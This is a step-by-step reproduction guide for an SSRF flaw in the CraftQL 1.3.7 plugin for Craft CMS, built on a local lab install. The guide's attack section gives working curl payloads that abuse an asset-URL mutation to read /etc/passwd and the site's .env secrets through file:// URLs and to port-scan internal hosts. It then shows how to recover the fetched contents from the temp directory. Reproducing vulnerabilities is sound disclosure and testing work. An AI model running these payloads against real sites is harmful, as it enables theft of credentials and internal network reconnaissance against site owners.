# CraftQL SSRF Vulnerability - Reproduction Guide

Complete guide to reproduce the CraftQL SSRF vulnerability.

---

## Table of Contents

- [Environment Setup](#environment-setup)
- [Step 1: Install Craft CMS 3.x](#step-1-install-craft-cms-3x)
- [Step 2: Install CraftQL](#step-2-install-craftql)
- [Step 3: Configure Test Environment](#step-3-configure-test-environment)
- [Step 4: Verify Vulnerability](#step-4-verify-vulnerability)
- [Step 5: Execute SSRF Attacks](#step-5-execute-ssrf-attacks)
- [Step 6: Verify Results](#step-6-verify-results)
- [Troubleshooting](#troubleshooting)

---

## Environment Setup

### System Requirements

| Component | Version | Notes |
|-----------|---------|-------|
| OS | Linux/macOS/Windows | Ubuntu 20.04+ recommended |
| PHP | 7.3 - 7.4 | Craft CMS 3.x compatible |
| MySQL | 5.7+ / 8.0+ | Database server |
| Composer | 2.x | Dependency management |
| Python | 3.6+ | For running POC |
| Nginx/Apache | Any | Web server |

### Install Software (Ubuntu)

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install PHP
sudo apt install -y php7.4 php7.4-fpm php7.4-mysql \
    php7.4-xml php7.4-mbstring php7.4-curl \
    php7.4-zip php7.4-gd php7.4-intl

# Install MySQL
sudo apt install -y mysql-server

# Install Composer
php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"
sudo php composer-setup.php --install-dir=/usr/local/bin --filename=composer

# Install Python
sudo apt install -y python3 python3-pip
pip3 install requests
```

---

## Step 1: Install Craft CMS 3.x

### 1.1 Create Project

```bash
mkdir -p ~/projects/craft-ssrf-test
cd ~/projects/craft-ssrf-test
```

### 1.2 Create composer.json

```bash
cat > composer.json << 'EOF'
{
    "name": "craftcms/craft-ssrf-test",
    "type": "project",
    "require": {
        "craftcms/cms": "^3.9.0"
    }
}
EOF
```

### 1.3 Install Dependencies

```bash
composer install
php craft --version  # Should show: Craft CMS 3.9.0
```

### 1.4 Configure .env

```bash
cat > .env << 'EOF'
CRAFT_APP_ID=CraftCMS--SSRF-POC
CRAFT_ENVIRONMENT=dev
CRAFT_SECURITY_KEY=SSRF-TEST-KEY-12345678901234567890
DEV_MODE=true
ALLOW_ADMIN_CHANGES=true

DB_DRIVER=mysql
DB_SERVER=localhost
DB_PORT=3306
DB_DATABASE=
DB_USER=
DB_PASSWORD=
EOF
```

### 1.5 Create Database

```bash
sudo mysql -u root -p << 'SQL'
CREATE DATABASE craftcms3 CHARACTER SET utf8mb4;
CREATE USER '***'@'localhost' IDENTIFIED BY '**';
GRANT ALL PRIVILEGES ON craftcms3.* TO '******'@'localhost';
FLUSH PRIVILEGES;
SQL
```

### 1.6 Install Craft

```bash
php craft install \
    --username=admin \
    --password=admin123 \
    --email=admin@example.com \
    --siteName="SSRF Test Site" \
    --siteUrl=http://localhost:8888
```

---

## Step 2: Install CraftQL

### 2.1 Install Plugin

```bash
composer require markhuot/craftql:1.3.7
php craft plugin/install craftql
```

### 2.2 Verify Installation

```bash
php craft plugin/list | grep -i craftql
# Expected: CraftQL | 1.3.7 | enabled
```

### 2.3 Verify Vulnerable Code

```bash
cat vendor/markhuot/craftql/src/Listeners/GetAssetsFieldSchema.php | \
    grep -A 3 "file_get_contents"
```

---

## Step 3: Configure Test Environment

### 3.1 Create Section (via Admin Panel)

1. Navigate to: `http://localhost:8888/admin`
2. Login: admin / admin123
3. Go to **Settings** → **Sections**
4. Create new section:
   - Name: `Test Section`
   - Handle: `test`
   - Type: `Channel`

### 3.2 Create Assets Field

1. Go to **Settings** → **Fields**
2. Create new field:
   - Type: **Assets**
   - Name: `Hero Image`
   - Handle: `heroImage`

### 3.3 Create GraphQL Token

**Via Database**:
```sql
mysql -u craftuser -pcraft123456 craftcms3 << 'SQL'
INSERT INTO craftql_tokens (name, token, scopes, userId, dateCreated, dateUpdated, uid)
VALUES (
    'Test Token',
    'l-ir-c*****************************************ySD',
    JSON_OBJECT(
        'query:sites', '1',
        'query:entries', '1',
        'query:assets', '1',
        'mutate:entryType:1', '1'
    ),
    1,
    NOW(),
    NOW(),
    UUID()
);
SQL
```

---

## Step 4: Verify Vulnerability

### 4.1 Check GraphQL API

```bash
curl -X POST http://localhost:8888/index.php?p=api \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query": "{ __schema { mutationType { fields { name } } } }"}'
```

### 4.2 Verify Mutation

Expected to see: `upsertTestDefault` in the mutation list.

---

## Step 5: Execute SSRF Attacks

### Attack #1: Read /etc/passwd

```bash
curl -X POST http://localhost:8888/index.php?p=api \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "query": "mutation { upsertTestDefault(heroImage: {url: \"file:///etc/passwd\"}) { id } }"
    }'
```

### Attack #2: Read .env

```bash
curl -X POST http://localhost:8888/index.php?p=api \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "query": "mutation { upsertTestDefault(heroImage: {url: \"file:///PATH/TO/.env\"}) { id } }"
    }'
```

### Attack #3: Port Scan

```bash
curl -X POST http://localhost:8888/index.php?p=api \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "query": "mutation { upsertTestDefault(heroImage: {url: \"http://192.168.1.1:22/\"}) { id } }"
    }'
```

---

## Step 6: Verify Results

### 6.1 Find Downloaded Files

```bash
find ~/projects/craft-ssrf-test/storage/runtime/temp/ \
    -type f -mmin -1 -name "*.tmp"
```

### 6.2 View File Contents

```bash
LATEST_FILE=$(find ~/projects/craft-ssrf-test/storage/runtime/temp/ \
    -type f -mmin -1 -name "*.tmp" | sort | tail -1)

cat $LATEST_FILE
```

---

## Troubleshooting

### Issue: "API connection failed"

**Solution**:
```bash
# Check connectivity
ping localhost
curl -I http://localhost:8888

# Check MySQL
sudo systemctl status mysql
```

### Issue: "Mutation not exposed"

**Solution**:
```bash
# Clear cache
rm -rf storage/runtime/cache/*

# Update token
UPDATE craftql_tokens
SET scopes = JSON_OBJECT('mutate:entryType:1', '1')
WHERE id = 1;
```
